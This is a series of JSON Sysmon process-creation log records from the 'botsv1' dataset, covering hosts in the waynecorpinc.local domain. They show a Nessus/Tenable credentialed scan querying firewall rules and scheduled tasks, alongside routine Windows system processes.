{"_time":"2016-08-24 10:34:56.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"358689","UtcTime":"2016-08-24 16:34:56.572","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd  /c netsh advfirewall show allprofiles firewallpolicy","ParentCommandLine":"cmd /c netsh advfirewall firewall show rule name=all verbose &gt; %SystemRoot%\\TEMP\\nessus_OCREA4YZ.TMP &amp; cmd /c netsh advfirewall show allprofiles firewallpolicy &gt;&gt; %SystemRoot%\\TEMP\\nessus_OCREA4YZ.TMP &amp; move %SystemRoot%\\TEMP\\nessus_OCREA4YZ.TMP %SystemRoot%\\TEMP\\nessus_OCREA4YZ.TXT","ProcessGuid":"{0F2D76F0-CCB0-57BD-0000-0010DBDA2B00}","ProcessId":"996","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:34:56.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"358702","UtcTime":"2016-08-24 16:34:56.587","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\netsh.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"netsh  advfirewall show allprofiles firewallpolicy","ParentCommandLine":"cmd  /c netsh advfirewall show allprofiles firewallpolicy","ProcessGuid":"{0F2D76F0-CCB0-57BD-0000-0010C7DC2B00}","ProcessId":"1528","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=BE48070856D4A1097B0DE1228711593728BB6EE1,MD5=637982A421D0133DCEAA0D1490D1DC9C,SHA256=CBAA8242C1013E4D9E48BEE146D6AC3ABF8B2370B7390D80A01344771A097B2A,IMPHASH=A9A596A237E98DC6D3B3E70DFC581E35","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:08.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3678136","UtcTime":"2016-08-24 16:35:08.762","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","ProcessGuid":"{46C72849-CCBC-57BD-0000-0010A8254A11}","ProcessId":"3660","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=5A4C0E82FF95C9FB762D46A696EF9F1B68001C21,MD5=CE6D08350D0A1278E9A97D94023D1800,SHA256=54AACAADDD25CC44B59A7637C3A1E7E3A8392CC6D22F4D2C5A202D29BF44AFC1,IMPHASH=5A7EE01A26FA2C5B5D57484D6FD004A4","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:15.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we1149srv","Computer":"we1149srv.waynecorpinc.local","EventCode":"1","RecordID":"3792425","UtcTime":"2016-08-24 16:35:15.743","User":"NT AUTHORITY\\NETWORK SERVICE","Image":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","ProcessGuid":"{E500B0EA-CCC3-57BD-0000-00108CD8B213}","ProcessId":"3536","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=5A4C0E82FF95C9FB762D46A696EF9F1B68001C21,MD5=CE6D08350D0A1278E9A97D94023D1800,SHA256=54AACAADDD25CC44B59A7637C3A1E7E3A8392CC6D22F4D2C5A202D29BF44AFC1,IMPHASH=5A7EE01A26FA2C5B5D57484D6FD004A4","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:17.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we1149srv","Computer":"we1149srv.waynecorpinc.local","EventCode":"1","RecordID":"3792503","UtcTime":"2016-08-24 16:35:17.446","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","ParentImage":"C:\\Windows\\System32\\svchost.exe","CommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch","ProcessGuid":"{E500B0EA-CCC5-57BD-0000-00101018B313}","ProcessId":"1208","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=5A4C0E82FF95C9FB762D46A696EF9F1B68001C21,MD5=CE6D08350D0A1278E9A97D94023D1800,SHA256=54AACAADDD25CC44B59A7637C3A1E7E3A8392CC6D22F4D2C5A202D29BF44AFC1,IMPHASH=5A7EE01A26FA2C5B5D57484D6FD004A4","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:32.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3678685","UtcTime":"2016-08-24 16:35:32.246","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\sc.exe","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","CommandLine":"sc start tenable_mw_scan type=1 output=nessus_QYVJLVDT.txt","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","ProcessGuid":"{46C72849-CCD4-57BD-0000-001017A24A11}","ProcessId":"2960","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=DBBA63CB28FC7F4E145E1DB05BBA9D7503FCA139,MD5=6E639FDBA5E9FA5974EF24412FEA30BF,SHA256=07ECAE0B0726FB46D4D13A5B5ACD7CBE72F93F9BBED79EB7EFBC9F685725CFC1,IMPHASH=071BD0C605D6FDAEF2AD09AD6B4C0CF8","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:32.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3678690","UtcTime":"2016-08-24 16:35:32.262","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\conhost.exe","ParentImage":"C:\\Windows\\System32\\sc.exe","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff","ParentCommandLine":"sc start tenable_mw_scan type=1 output=nessus_QYVJLVDT.txt","ProcessGuid":"{46C72849-CCD4-57BD-0000-001084A24A11}","ProcessId":"3572","CurrentDirectory":"C:\\Windows","Hashes":"SHA1=2C6B753628A3AA138AE52357F76AA4D5617D890E,MD5=626A9EC445D06FBC1502BF53A1E3356B,SHA256=42A43BF18F7C0FA4DB997E8B7688711C9B36BD73D5F013FA5B418F0956A92266,IMPHASH=766BBBC554510CAA578DC083D295D781","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:32.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3678709","UtcTime":"2016-08-24 16:35:32.277","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","ParentCommandLine":"C:\\Windows\\system32\\services.exe","ProcessGuid":"{46C72849-CCD4-57BD-0000-001030A44A11}","ProcessId":"816","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=9279E68EF65F409E8A4DBEF4586FB5D10B2E4943,MD5=F106701B622D82C0D713DA04327594CC,SHA256=439DF3AEAE79D405D96C884C6B37D1A0ECA0092A1BC8C111D1D41EFF71935A4F,IMPHASH=D53EA882C20DE9242CC1FC18D020478C","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:36.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"359157","UtcTime":"2016-08-24 16:35:36.383","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\conhost.exe","ParentImage":"C:\\Windows\\System32\\csrss.exe","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe","ParentCommandLine":"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","ProcessGuid":"{0F2D76F0-CCD8-57BD-0000-0010E5492C00}","ProcessId":"2700","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=680DEC0F8907F4B8911FBE2AA5F2FD25425BE0B0,MD5=BD51024FB014064BC9FE8C715C18392F,SHA256=23F7AB98268F88E6CA9EE96B3DDBC6AA745BFFACD2E5F80A211CE48D976EB9A4,IMPHASH=C2AE82D74851F310DFB66DA9B301EF7E","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:36.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"359152","UtcTime":"2016-08-24 16:35:36.383","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","CommandLine":"cmd /c \"schtasks /query /XML &gt; %SystemRoot%\\TEMP\\nessus_VPG2T4UF.TMP &amp; ren %SystemRoot%\\TEMP\\nessus_VPG2T4UF.TMP nessus_VPG2T4UF.TXT\"","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","ProcessGuid":"{0F2D76F0-CCD8-57BD-0000-00105E492C00}","ProcessId":"2308","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:35:36.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"359206","UtcTime":"2016-08-24 16:35:36.461","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\schtasks.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"schtasks  /query /XML","ParentCommandLine":"cmd /c \"schtasks /query /XML &gt; %SystemRoot%\\TEMP\\nessus_VPG2T4UF.TMP &amp; ren %SystemRoot%\\TEMP\\nessus_VPG2T4UF.TMP nessus_VPG2T4UF.TXT\"","ProcessGuid":"{0F2D76F0-CCD8-57BD-0000-0010AD4D2C00}","ProcessId":"3848","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=BD9DCEFFBCBBC82BEE5F2109BD73A57477FE1F92,MD5=97E0EC3D6D99E8CC2B17EF2D3760E8FC,SHA256=6DCE7D58EBB0D705FCB4179349C441B45E160C94E43934C5ED8FA1964E2CD031,IMPHASH=6B4559CA4C2EC47B1D1D5FB43FFA83AD","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:02.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679035","UtcTime":"2016-08-24 16:36:02.339","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\choice.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"choice  /T 1 /C X /D X /N","ParentCommandLine":"cmd /c C:\\Windows\\temp\\nessus_ZCHPYH15.bat","ProcessGuid":"{46C72849-CCF2-57BD-0000-0010F70A4B11}","ProcessId":"1908","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=B78EF6A7739820A9BA2A5905405EB15AB4624C35,MD5=B081FFE617796C32CFA6736C9D43D32F,SHA256=BAB6D21204A6CB5D6C707427B82AF5882F0A7129BD28D10B86015404ED6358F1,IMPHASH=8403531C14B5318C5A5C5F18B7B58E3B","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:02.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679015","UtcTime":"2016-08-24 16:36:02.339","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\conhost.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff","ParentCommandLine":"cmd /c C:\\Windows\\temp\\nessus_ZCHPYH15.bat","ProcessGuid":"{46C72849-CCF2-57BD-0000-0010D4084B11}","ProcessId":"3384","CurrentDirectory":"C:\\Windows","Hashes":"SHA1=2C6B753628A3AA138AE52357F76AA4D5617D890E,MD5=626A9EC445D06FBC1502BF53A1E3356B,SHA256=42A43BF18F7C0FA4DB997E8B7688711C9B36BD73D5F013FA5B418F0956A92266,IMPHASH=766BBBC554510CAA578DC083D295D781","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:02.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we9041srv","Computer":"we9041srv.waynecorpinc.local","EventCode":"1","RecordID":"3679010","UtcTime":"2016-08-24 16:36:02.339","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","CommandLine":"cmd /c C:\\Windows\\temp\\nessus_ZCHPYH15.bat","ParentCommandLine":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","ProcessGuid":"{46C72849-CCF2-57BD-0000-00106F084B11}","ProcessId":"3888","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=0C2E3CF2D2F09792960A73DC772A086E99A96764,MD5=FC0B4A626881D7C5980D757214DB2D25,SHA256=0B9BC863E2807B6886760480083E51BA8A66118659F4FF274E7B73944D2219F5,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:14.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"359905","UtcTime":"2016-08-24 16:36:14.134","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\sc.exe","ParentImage":"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe","CommandLine":"sc start tenable_mw_scan type=1 output=nessus_SFBBT7QA.txt","ParentCommandLine":"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding","ProcessGuid":"{0F2D76F0-CCFE-57BD-0000-00109BDE2C00}","ProcessId":"2508","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=DB1F81F5E209FED6DF3255F6C820555CF17A839C,MD5=4EBBC2B0AD7F9075AE9D6835D2A62B6E,SHA256=EAAB690EBD8DDF9AE452DE1BC03B73C8154264DBD7A292334733B47A668EBF31,IMPHASH=C8F4DCFEB5FE9D42D74FAA6E2104E850","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:14.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"359909","UtcTime":"2016-08-24 16:36:14.150","User":"WAYNECORPINC\\Administrator","Image":"C:\\Windows\\System32\\conhost.exe","ParentImage":"C:\\Windows\\System32\\csrss.exe","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe","ParentCommandLine":"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","ProcessGuid":"{0F2D76F0-CCFE-57BD-0000-001059DF2C00}","ProcessId":"2208","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=680DEC0F8907F4B8911FBE2AA5F2FD25425BE0B0,MD5=BD51024FB014064BC9FE8C715C18392F,SHA256=23F7AB98268F88E6CA9EE96B3DDBC6AA745BFFACD2E5F80A211CE48D976EB9A4,IMPHASH=C2AE82D74851F310DFB66DA9B301EF7E","IntegrityLevel":"High","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:14.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"359931","UtcTime":"2016-08-24 16:36:14.181","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","ParentCommandLine":"C:\\Windows\\system32\\services.exe","ProcessGuid":"{0F2D76F0-CCFE-57BD-0000-001081E22C00}","ProcessId":"2028","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=9279E68EF65F409E8A4DBEF4586FB5D10B2E4943,MD5=F106701B622D82C0D713DA04327594CC,SHA256=439DF3AEAE79D405D96C884C6B37D1A0ECA0092A1BC8C111D1D41EFF71935A4F,IMPHASH=D53EA882C20DE9242CC1FC18D020478C","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:14.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"359954","UtcTime":"2016-08-24 16:36:14.228","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\SearchFilterHost.exe","ParentImage":"C:\\Windows\\System32\\SearchIndexer.exe","CommandLine":"\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 524 528 536 65536 532","ParentCommandLine":"C:\\Windows\\system32\\SearchIndexer.exe /Embedding","ProcessGuid":"{0F2D76F0-CCFE-57BD-0000-0010B0E52C00}","ProcessId":"3132","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=904A3B130E3DB7CEA97F31CC40D64D9026FF6E41,MD5=52D56D1013D4F1B99102679314CC5325,SHA256=F8F6C41FEC774C71A85C91DFEB057076D018E5A64CE1D7B7D9D202CA65B34758,IMPHASH=48476C179FBF9FC0CC7AE2A8A5FB1073","IntegrityLevel":"Medium","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:24.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we1149srv","Computer":"we1149srv.waynecorpinc.local","EventCode":"1","RecordID":"3792776","UtcTime":"2016-08-24 16:36:24.773","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\smss.exe","ParentImage":"C:\\Windows\\System32\\smss.exe","CommandLine":"\\SystemRoot\\System32\\smss.exe 00000000 00000050","ParentCommandLine":"\\SystemRoot\\System32\\smss.exe","ProcessGuid":"{E500B0EA-CD08-57BD-0000-0010C769B313}","ProcessId":"2600","CurrentDirectory":"C:\\Windows\\","Hashes":"SHA1=D6F56CBF9D3EF411760AD68F9FCE9B5EB52D55C0,MD5=89B91AEEE4C0C5D3708C0F177C97B630,SHA256=E971CADE6F049F2790BDE863FF1EAAFCCA893D3DAFE3522A571C74E0F8F6187A,IMPHASH=1201638E667D318EF0E2BB7BD632334E","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:24.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we1149srv","Computer":"we1149srv.waynecorpinc.local","EventCode":"1","RecordID":"3792781","UtcTime":"2016-08-24 16:36:24.788","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\csrss.exe","ParentImage":"C:\\Windows\\System32\\smss.exe","CommandLine":"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","ParentCommandLine":"\\SystemRoot\\System32\\smss.exe 00000000 00000050","ProcessGuid":"{E500B0EA-CD08-57BD-0000-0010326AB313}","ProcessId":"4072","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=C79E4586989EBB8E8F8084B5EB49AFBFD243A625,MD5=B2D3F07F5E8A13AF988A8B3C0A800880,SHA256=CB41E9D0E8107AA9337DBD1C56F22461131AD0952A2472B4477E2649D16ECB15,IMPHASH=2C3DC617C728D46744B951F769654054","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:24.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we1149srv","Computer":"we1149srv.waynecorpinc.local","EventCode":"1","RecordID":"3792792","UtcTime":"2016-08-24 16:36:24.820","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\winlogon.exe","ParentImage":"C:\\Windows\\System32\\smss.exe","CommandLine":"winlogon.exe","ParentCommandLine":"\\SystemRoot\\System32\\smss.exe 00000000 00000050","ProcessGuid":"{E500B0EA-CD08-57BD-0000-0010806BB313}","ProcessId":"3904","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=2E2F86C0FBB19E7DB1B7C6CD9F45934A567134E9,MD5=7C94FDA3809015B8F2208D2E1C221F17,SHA256=71486B77FE0D3A97D2C2DCC527AC1EB44C9155601403C9E79F9854DB58CA8F68,IMPHASH=B7625D79A827AAEDE8498726FDB2D638","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:25.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we1149srv","Computer":"we1149srv.waynecorpinc.local","EventCode":"1","RecordID":"3792818","UtcTime":"2016-08-24 16:36:25.210","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\LogonUI.exe","ParentImage":"C:\\Windows\\System32\\winlogon.exe","CommandLine":"\"LogonUI.exe\" /flags:0x0","ParentCommandLine":"winlogon.exe","ProcessGuid":"{E500B0EA-CD09-57BD-0000-00100679B313}","ProcessId":"3736","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=00E95FD493D6169DB28A4DC736173EFC135F8391,MD5=3710A8A7508B36AD96A97CE79E17403E,SHA256=DD9807B58607825F1B4E13602B147B5FF6F3D72559136B718DB3B99D42D015F6,IMPHASH=2A2F2BC4A706AB8A63E90D08A89A1087","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:26.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we1149srv","Computer":"we1149srv.waynecorpinc.local","EventCode":"1","RecordID":"3792883","UtcTime":"2016-08-24 16:36:26.585","User":"Window Manager\\DWM-3","Image":"C:\\Windows\\System32\\dwm.exe","ParentImage":"C:\\Windows\\System32\\winlogon.exe","CommandLine":"\"dwm.exe\"","ParentCommandLine":"winlogon.exe","ProcessGuid":"{E500B0EA-CD0A-57BD-0000-00109883B313}","ProcessId":"1092","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=2A9F711A601DB66788695BF6C8EFCF9C47632F84,MD5=B4BBC6E4998042EF21437EED52EC0273,SHA256=93259A6EFD00F8DB7A700143690857428BAFD7073525DEE3E9D24589CB962EE0,IMPHASH=16DEF1047A34501B2F2AC35240ED3CAD","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:44.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"360259","UtcTime":"2016-08-24 16:36:44.226","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\conhost.exe","ParentImage":"C:\\Windows\\System32\\csrss.exe","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe","ParentCommandLine":"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","ProcessGuid":"{0F2D76F0-CD1C-57BD-0000-0010116F2D00}","ProcessId":"2676","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=680DEC0F8907F4B8911FBE2AA5F2FD25425BE0B0,MD5=BD51024FB014064BC9FE8C715C18392F,SHA256=23F7AB98268F88E6CA9EE96B3DDBC6AA745BFFACD2E5F80A211CE48D976EB9A4,IMPHASH=C2AE82D74851F310DFB66DA9B301EF7E","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:44.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"360253","UtcTime":"2016-08-24 16:36:44.226","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","CommandLine":"cmd /c C:\\Windows\\temp\\nessus_W7GLH62C.bat","ParentCommandLine":"C:\\Windows\\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe","ProcessGuid":"{0F2D76F0-CD1C-57BD-0000-0010476E2D00}","ProcessId":"1208","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8,MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,SHA256=DB06C3534964E3FC79D2763144BA53742D7FA250CA336F4A0FE724B75AAFF386,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A","IntegrityLevel":"System","dataset":"botsv1"}
{"_time":"2016-08-24 10:36:44.000 MDT","sourcetype":"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational","host":"we8105desk","Computer":"we8105desk.waynecorpinc.local","EventCode":"1","RecordID":"360287","UtcTime":"2016-08-24 16:36:44.273","User":"NT AUTHORITY\\SYSTEM","Image":"C:\\Windows\\System32\\choice.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"choice  /T 1 /C X /D X /N","ParentCommandLine":"cmd /c C:\\Windows\\temp\\nessus_W7GLH62C.bat","ProcessGuid":"{0F2D76F0-CD1C-57BD-0000-0010CE722D00}","ProcessId":"1140","CurrentDirectory":"C:\\Windows\\system32\\","Hashes":"SHA1=0EDCC10670D29E5CA59702FACEF13D8F3376AFC5,MD5=BD3E64A49311E558C08F4F04B53F82D8,SHA256=5AF7D20DA70CCB712C0E441E83F01BE0633F6F804289BFF1B3CEB5F853F0DC80,IMPHASH=B0320E6CF25E8B4FFD2FC383379E246A","IntegrityLevel":"System","dataset":"botsv1"}
